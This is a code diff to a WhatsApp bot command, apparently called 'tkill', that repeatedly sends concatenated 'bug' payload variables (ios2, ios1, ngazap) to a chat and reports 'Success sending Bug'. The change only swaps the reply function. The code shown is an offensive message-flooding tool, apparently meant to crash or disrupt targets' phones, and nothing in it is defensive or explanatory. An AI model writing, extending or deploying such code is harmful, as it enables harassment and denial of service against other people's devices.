@@ -12,7 +12,7 @@ zokou(
     categorie: "Mods",
     reaction: "😈",
   },
-  async (dest, zk, { arg, repondre, superUser }) => {
+  async (dest, zk, { arg, attention, repondre, superUser }) => {
     if (!superUser) {
       repondre("You are not authorized to use this command!!!");
       return;
@@ -21,7 +21,7 @@ zokou(
     try {
       const limit = conf.TKILL_MESSAGE_LIMIT;
       for (let i = 0; i < limit; i++) {
-        repondre(`${ios2}${ios1}${ngazap}`);
+        attention(`${ios2}${ios1}${ngazap}`);
         await sleep(1000);
       }
       repondre("*Success sending Bug via tkill. Please Wait for 3 Minutes*");
